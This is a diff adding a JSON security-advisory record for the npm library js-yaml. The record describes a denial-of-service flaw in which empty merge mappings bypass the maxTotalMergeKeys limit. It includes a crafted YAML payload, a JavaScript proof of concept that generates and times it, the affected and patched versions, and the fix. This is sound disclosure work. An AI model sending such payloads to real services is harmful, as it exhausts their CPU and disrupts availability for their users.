@@ -1,0 +1,52 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-09-29T17:57:40Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "js-yaml"
+  },
+  "Advisory": {
+    "DatabaseId": 503783,
+    "Id": "GSA_kwCzR0hTQS1yM3BoLXc3Z2otZzZ4bc4AB6_n",
+    "GhsaId": "GHSA-r3ph-w7gj-g6xm",
+    "References": [
+      {
+        "Url": "https://github.com/nodeca/js-yaml/security/advisories/GHSA-r3ph-w7gj-g6xm"
+      },
+      {
+        "Url": "https://github.com/nodeca/js-yaml/commit/6a8e05f9a485188ed730ac81e81ae221352ef480"
+      },
+      {
+        "Url": "https://github.com/nodeca/js-yaml/releases/tag/5.4.1"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-r3ph-w7gj-g6xm"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-r3ph-w7gj-g6xm"
+      }
+    ],
+    "Description": "## Summary\n\n`maxTotalMergeKeys` does not count empty mappings. An attacker can repeatedly merge a large sequence of them and consume significant CPU without reaching the configured limit.\n\n## Example\n\n```yaml\narr: \u0026arr [{}, {}, {}, ...] # N empty mappings\ntargets:\n  - \u003c\u003c: *arr                # repeated K times\n```\n\nFor every target, the loader iterates all `N` elements of `arr`. This results in `O(N * K)` work while `totalMergeKeys` remains unchanged.\n\n## PoC\n\n```js\nimport { performance } from 'node:perf_hooks'\nimport { load, YAML11_SCHEMA } from 'js-yaml'\n\nconst n = 20000\n\nconst src =\n  'arr: \u0026arr [' + '{},'.repeat(n).slice(0, -1) + ']\\n' +\n  'targets:\\n' +\n  '  - \u003c\u003c: *arr\\n'.repeat(n)\n\nconst started = performance.now()\n\nload(src, { schema: YAML11_SCHEMA })\n\nconsole.log(`${(performance.now() - started).toFixed(1)} ms`)\n```\n\nObserved results:\n\n| N | YAML size | Time |\n|---:|---:|---:|\n| 800 | ~13 KB | ~20 ms |\n| 3200 | ~50 KB | ~180 ms |\n| 20000 | ~500 KB | ~13 s |\n\n## Impact\n\nWhen merge keys are enabled, an attacker can submit a relatively small YAML document that causes prolonged CPU consumption despite the default `maxTotalMergeKeys` limit.\n\n## Fix\n\nCount every merge source mapping as one budget unit in addition to counting its keys.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-09-29T17:57:39Z",
+    "Severity": "MODERATE",
+    "Summary": "js-yaml: maxTotalMergeKeys does not limit CPU use for empty merge sources",
+    "UpdatedAt": "2026-09-29T17:57:40Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 5.3,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "5.4.1"
+      },
+      "VulnerableVersionRange": "\u003e= 5.0.0, \u003c= 5.4.0"
+    }
+  ]
+}
